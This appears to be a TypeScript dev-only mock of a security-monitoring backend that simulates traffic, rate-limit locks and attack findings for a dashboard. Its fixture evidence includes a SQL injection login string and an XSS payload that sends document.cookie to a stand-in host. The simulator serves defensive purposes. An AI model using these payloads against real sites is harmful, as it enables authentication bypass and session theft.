import { http, HttpResponse } from 'msw';
import type {
  Finding,
  FindingAnalysis,
  FindingCategory,
  MetricsBucket,
  MetricsSnapshot,
  Mitigation,
  SocEvent,
  SocIncident,
  SocSeverity,
} from '@/types/soc';

/**
 * Dev-only SOC simulator. Approximates the backend pipeline (apps/api/app/adaptive/soc_pipeline.py)
 * closely enough to exercise every dashboard state: steady traffic, a rate-limit burst that escalates
 * to a lock, an injection probe that locks immediately, and flag-only findings.
 */

const POLICY = { limit: 60, windowSeconds: 60, escalationCount: 3, escalationWindowSeconds: 300, lockDurationSeconds: 90 };
const BENIGN = ['10.0.4.12', '10.0.4.31', '172.16.2.8', '192.168.10.44', '10.0.7.3'];

const iso = (ms = Date.now()) => new Date(ms).toISOString();
const rid = (p: string) => `${p}-${Math.random().toString(36).slice(2, 12)}`;

const state = {
  series: [] as MetricsBucket[],
  incidents: [] as SocIncident[],
  findings: [] as Finding[],
  mitigations: new Map<string, Mitigation>(),
  window: new Map<string, number[]>(),
  listeners: new Set<(ev: SocEvent) => void>(),
  tick: 0,
};

const emit = (type: SocEvent['type'], data: unknown) => {
  const ev: SocEvent = { id: rid('evt'), type, ts: iso(), data };
  state.listeners.forEach((l) => l(ev));
};

function bucket(ts: number): MetricsBucket {
  return { ts: iso(ts), total: 0, allowed: 0, flagged: 0, throttled: 0, locked: 0, rejected: 0, peakSourceRate: 0 };
}

function hit(src: string, now: number) {
  const w = (state.window.get(src) ?? []).filter((t) => t > now - POLICY.windowSeconds * 1000);
  w.push(now);
  state.window.set(src, w);
  return w.length;
}

function openIncident(src: string, title: string, severity: SocSeverity): SocIncident {
  let inc = state.incidents.find((i) => i.sourceKey === src && i.status !== 'RESOLVED');
  if (!inc) {
    inc = {
      id: rid('inc'), sourceKey: src, title, severity, status: 'OPEN', stage: 'INGESTED',
      steps: [{ stage: 'INGESTED', at: iso(), detail: `Traffic from ${src} ingested` }],
      findingIds: [], blockedRequests: 0, openedAt: iso(), updatedAt: iso(),
    };
    state.incidents.unshift(inc);
    state.incidents = state.incidents.slice(0, 60);
  }
  return inc;
}

const DIAG: Record<FindingCategory, string> = {
  RATE_LIMIT_EXCEEDED: 'Requests in 60s exceeded the policy limit of 60.',
  BRUTE_FORCE_AUTH: '5 failed logins in 60s.',
  MALFORMED_PAYLOAD: "Declared Content-Type is JSON but the body failed to parse: Expecting value at line 1, column 10.",
  OVERSIZED_PAYLOAD: 'Request body exceeded the 1,048,576-byte limit.',
  SQL_INJECTION: 'Input closes a string literal and appends a tautology or comment (e.g. \' OR 1=1 --).',
  PATH_TRAVERSAL: 'Input contains relative path segments or well-known system file paths.',
  XSS_PROBE: 'Input contains executable HTML/JS markup.',
};

function addFinding(inc: SocIncident, f: Omit<Finding, 'id' | 'ts' | 'diagnostic' | 'incidentId' | 'sourceKey'>) {
  const finding: Finding = { ...f, id: rid('fnd'), ts: iso(), sourceKey: inc.sourceKey, diagnostic: DIAG[f.category], incidentId: inc.id };
  state.findings.unshift(finding);
  state.findings = state.findings.slice(0, 200);
  inc.findingIds.push(finding.id);
  inc.steps.push({ stage: 'DETECTED', at: iso(), detail: `${f.ruleId}: ${f.category} in ${f.location}${f.field ? ` (${f.field})` : ''}` });
  if (inc.stage === 'INGESTED') inc.stage = 'DETECTED';
  inc.updatedAt = iso();
  emit('finding.created', finding);
  return finding;
}

function enforce(inc: SocIncident, action: 'THROTTLE' | 'LOCK', ruleId: string, reason: string, severity: SocSeverity, secs: number) {
  const m: Mitigation = {
    sourceKey: inc.sourceKey, action, ruleId, reason, severity,
    createdAt: iso(), expiresAt: iso(Date.now() + secs * 1000), blockedRequests: 1,
  };
  state.mitigations.set(inc.sourceKey, m);
  inc.mitigation = m;
  inc.severity = severity === 'CRITICAL' || inc.severity === 'CRITICAL' ? 'CRITICAL' : severity === 'HIGH' ? 'HIGH' : inc.severity;
  inc.steps.push({ stage: 'ENFORCED', at: iso(), detail: `${action} (HTTP ${action === 'LOCK' ? 423 : 429}) via ${ruleId}: ${reason}` });
  inc.steps.push({ stage: 'MITIGATED', at: iso(), detail: 'Policy actively rejecting traffic from source' });
  inc.stage = 'MITIGATED';
  inc.status = 'MITIGATED';
  inc.blockedRequests += 1;
  inc.updatedAt = iso();
  emit('policy.enforced', { mitigation: m, incident: inc });
  emit('incident.updated', inc);
}

function resolve(src: string, why: string) {
  const inc = state.incidents.find((i) => i.sourceKey === src && i.status !== 'RESOLVED');
  if (!inc) return;
  inc.status = 'RESOLVED';
  inc.resolvedAt = inc.updatedAt = iso();
  inc.steps.push({ stage: inc.stage, at: iso(), detail: `Resolved: ${why}` });
  emit('incident.updated', inc);
}

function simulateSecond() {
  const now = Date.now();
  const b = bucket(Math.floor(now / 1000) * 1000);
  state.tick += 1;
  const phase = state.tick % 120;

  const request = (src: string) => {
    const m = state.mitigations.get(src);
    b.total += 1;
    if (m) {
      m.blockedRequests += 1;
      if (m.action === 'LOCK') b.locked += 1;
      else b.throttled += 1;
      return false;
    }
    const n = hit(src, now);
    b.peakSourceRate = Math.max(b.peakSourceRate, n);
    if (n > POLICY.limit) {
      b.throttled += 1;
      const inc = openIncident(src, 'Request rate limit exceeded', 'MEDIUM');
      addFinding(inc, { method: 'GET', path: '/api/v1/assets', category: 'RATE_LIMIT_EXCEEDED', ruleId: 'RULE-RATE-001', severity: 'MEDIUM', location: 'path' });
      const escalate = state.tick % 3 === 0;
      if (escalate) enforce(inc, 'LOCK', 'RULE-RATE-002', 'Rate limit violated 3x within 300s', 'HIGH', POLICY.lockDurationSeconds);
      else enforce(inc, 'THROTTLE', 'RULE-RATE-001', `${n} requests in 60s exceeds limit of 60`, 'MEDIUM', 20);
      return false;
    }
    b.allowed += 1;
    return true;
  };

  for (const ip of BENIGN) for (let i = 0; i < 1 + Math.floor(Math.random() * 3); i++) request(ip);

  // Scraper burst ramps up between 20s and 50s of every 2-minute cycle.
  if (phase >= 20 && phase < 50) for (let i = 0; i < 4 + (phase - 20) / 3; i++) request('203.0.113.7');

  // Injection probe -> immediate lock.
  if (phase === 70 && request('198.51.100.23')) {
    b.allowed -= 1;
    b.locked += 1;
    const inc = openIncident('198.51.100.23', 'SQL injection attempt', 'CRITICAL');
    addFinding(inc, {
      method: 'POST', path: '/api/v1/auth/login', category: 'SQL_INJECTION', ruleId: 'RULE-INJ-003',
      severity: 'HIGH', location: 'body', field: 'email', evidence: "admin' OR '1'='1' --",
    });
    enforce(inc, 'LOCK', 'RULE-INJ-003', 'sql injection detected in request (RULE-INJ-003)', 'HIGH', POLICY.lockDurationSeconds);
  }
  if (phase > 70 && phase < 85) for (let i = 0; i < 2; i++) request('198.51.100.23');

  // Flag-only findings.
  if (phase === 95 || phase === 10) {
    b.flagged += 1;
    b.allowed -= 1;
    const src = phase === 95 ? '192.0.2.55' : '192.0.2.81';
    const inc = openIncident(src, phase === 95 ? 'Cross-site scripting probe' : 'Malformed request payload', 'MEDIUM');
    addFinding(inc, phase === 95
      ? { method: 'GET', path: '/search', category: 'XSS_PROBE', ruleId: 'RULE-XSS-001', severity: 'MEDIUM', location: 'query', field: 'q', evidence: '<script>fetch("//x.example/"+document.cookie)</script>' }
      : { method: 'POST', path: '/api/v1/telemetry/ingest', category: 'MALFORMED_PAYLOAD', ruleId: 'RULE-PAY-001', severity: 'MEDIUM', location: 'body', evidence: '{"events": [,' });
    emit('incident.updated', inc);
  }

  for (const [src, m] of state.mitigations) {
    if (new Date(m.expiresAt).getTime() <= now) {
      state.mitigations.delete(src);
      emit('mitigation.expired', m);
      resolve(src, `${m.action.toLowerCase()} mitigation window elapsed`);
    }
  }

  state.series.push(b);
  state.series = state.series.slice(-300);
  emit('metrics.tick', { bucket: b, activeMitigations: [...state.mitigations.values()], stageCounts: stageCounts() });
}

function stageCounts() {
  const c = { INGESTED: 0, DETECTED: 0, ENFORCED: 0, MITIGATED: 0, RESOLVED: 0 };
  for (const i of state.incidents) {
    for (const st of new Set(i.steps.map((x) => x.stage))) c[st] += 1;
    if (i.status === 'RESOLVED') c.RESOLVED += 1;
  }
  return c;
}

function snapshot(): MetricsSnapshot {
  const now = Date.now();
  const padded: MetricsBucket[] = [];
  const have = new Map(state.series.map((b) => [b.ts, b]));
  for (let i = 299; i >= 0; i--) {
    const ts = iso(Math.floor((now - i * 1000) / 1000) * 1000);
    padded.push(have.get(ts) ?? bucket(new Date(ts).getTime()));
  }
  const totals: Record<string, number> = {};
  for (const [k, v] of Object.entries(stageCounts())) totals[`stage${k[0]}${k.slice(1).toLowerCase()}`] = v;
  const top = [...state.window.entries()]
    .map(([sourceKey, w]) => ({ sourceKey, requestsInWindow: w.filter((t) => t > now - 60_000).length }))
    .filter((s) => s.requestsInWindow)
    .sort((a, b) => b.requestsInWindow - a.requestsInWindow)
    .slice(0, 5);
  return { series: padded, policy: POLICY, activeMitigations: [...state.mitigations.values()], topSources: top, totals };
}

const RECS: Record<string, FindingAnalysis['recommendations']> = {
  SQL_INJECTION: [
    { title: 'Use prepared statements / bound parameters everywhere', detail: 'Never build SQL with string formatting; bind values.', snippet: "row = await conn.fetchrow('SELECT id FROM users WHERE email = $1', email)", snippetLanguage: 'python', reference: 'https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html' },
    { title: 'Run the application with a least-privilege database role', detail: 'No DDL, no superuser, row-level security where available.' },
  ],
  XSS_PROBE: [
    { title: 'Encode output for its context', detail: 'Never pass user input to dangerouslySetInnerHTML or innerHTML.' },
    { title: 'Ship a strict Content-Security-Policy', detail: 'Nonce-based script-src blocks injected inline script.', snippet: "Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{random}' 'strict-dynamic'; object-src 'none'; base-uri 'none'", snippetLanguage: 'http' },
  ],
  MALFORMED_PAYLOAD: [
    { title: 'Validate input against a strict schema at the boundary', detail: 'Reject unknown fields, enforce types and lengths.', snippet: "model_config = ConfigDict(extra='forbid', strict=True)", snippetLanguage: 'python' },
  ],
  RATE_LIMIT_EXCEEDED: [
    { title: 'Advertise limits with standard headers', detail: 'Return 429 with Retry-After and RateLimit-* headers.', snippet: 'HTTP/1.1 429 Too Many Requests\nRetry-After: 30', snippetLanguage: 'http' },
  ],
};

let timer: ReturnType<typeof setInterval> | null = null;
const ensureRunning = () => {
  if (!timer) timer = setInterval(simulateSecond, 1000);
};

export const socHandlers = [
  http.get('/api/soc/metrics', () => {
    ensureRunning();
    return HttpResponse.json(snapshot());
  }),
  http.get('/api/soc/incidents', () => HttpResponse.json(state.incidents)),
  http.get('/api/soc/findings', () => HttpResponse.json(state.findings)),
  http.get('/api/soc/findings/:id/analysis', ({ params }) => {
    const f = state.findings.find((x) => x.id === params.id);
    if (!f) return new HttpResponse(null, { status: 404 });
    return HttpResponse.json({
      finding: f,
      rootCause: f.diagnostic,
      impact: 'Simulated finding — see backend remediation knowledge base for full guidance.',
      recommendations: RECS[f.category] ?? [],
      relatedFindings: state.findings.filter((x) => x.sourceKey === f.sourceKey && x.id !== f.id).slice(0, 10),
    } satisfies FindingAnalysis);
  }),
  http.delete('/api/soc/mitigations/:source', ({ params }) => {
    const src = decodeURIComponent(params.source as string);
    const m = state.mitigations.get(src);
    if (!m) return new HttpResponse(null, { status: 404 });
    state.mitigations.delete(src);
    emit('mitigation.released', m);
    resolve(src, 'released by analyst');
    return HttpResponse.json(m);
  }),
  http.get('/api/soc/stream', () => {
    ensureRunning();
    const enc = new TextEncoder();
    let listener: ((ev: SocEvent) => void) | null = null;
    const stream = new ReadableStream({
      start(ctrl) {
        listener = (ev) => ctrl.enqueue(enc.encode(`id: ${ev.id}\nevent: ${ev.type}\ndata: ${JSON.stringify(ev)}\n\n`));
        state.listeners.add(listener);
      },
      cancel() {
        if (listener) state.listeners.delete(listener);
      },
    });
    return new HttpResponse(stream, { headers: { 'Content-Type': 'text/event-stream' } });
  }),
];
